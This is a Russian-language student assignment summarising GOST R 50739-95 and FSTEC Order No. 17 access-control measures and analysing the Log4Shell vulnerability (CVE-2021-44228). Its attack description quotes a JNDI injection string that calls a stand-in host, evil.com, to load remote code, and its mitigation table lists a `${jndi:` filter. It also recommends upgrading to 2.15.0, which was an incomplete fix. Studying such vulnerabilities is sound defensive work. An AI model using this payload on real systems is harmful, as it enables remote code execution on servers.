# ПР №2. Нормативная база и анализ CVE

## 1. Нормативные документы

### ГОСТ Р 50739-95
- **Область применения:** Защита от несанкционированного доступа (НСД) к информации в автоматизированных системах (АС). Устанавливает классификацию и требования к системам защиты.
- **Количество классов защищённости:** Определено 5 классов защищённости (от 5-го (самый низкий) до 1-го (самый высокий)).
- **Что регулирует управление доступом:** Устанавливает требования к идентификации и проверке подлинности пользователей, а также к разграничению доступа субъектов к объектам.

### Приказ ФСТЭК №17
- **Кому адресован:** Распространяется на Государственные информационные системы (ГИС).
- **Группа мер УПД (Управление правами доступа) включает:**
  1. Управление правами доступа пользователей
  2. Назначение ролей пользователям
  3. Ограничение количества администраторов
  4. Контроль действий пользователей с высокими привилегиями

## 2. Анализ уязвимости

**CVE-идентификатор:** CVE-2021-44228
**CVSS Score:** 10.0 (Критический)
**Затронутый продукт:** Apache Log4j версии 2.0-beta9 до 2.15.0

### Описание
Уязвимость позволяет удалённое выполнение кода (RCE) через JNDI-инъекцию.

### Механизм атаки
1. Злоумышленник отправляет специальный запрос с `${jndi:ldap://evil.com/exploit}`
2. Log4j обрабатывает строку и обращается к LDAP-серверу
3. Сервер возвращает вредоносный код
4. Происходит выполнение кода на сервере жертвы

**Ущерб:**
- Конфиденциальность: Высокий
- Целостность: Высокий
- Доступность: Высокий

### Применимые меры защиты по Приказу ФСТЭК №17
| Группа мер | Мера | Как помогает |
|---|---|---|
| ОПС | Обновление ПО | Обновить Log4j до версии 2.15.0 |
| ЗИС | Фильтрация входных данных | Блокировать строки с `${jndi:` |
| УПД | Минимальные привилегии | Ограничить права процесса |
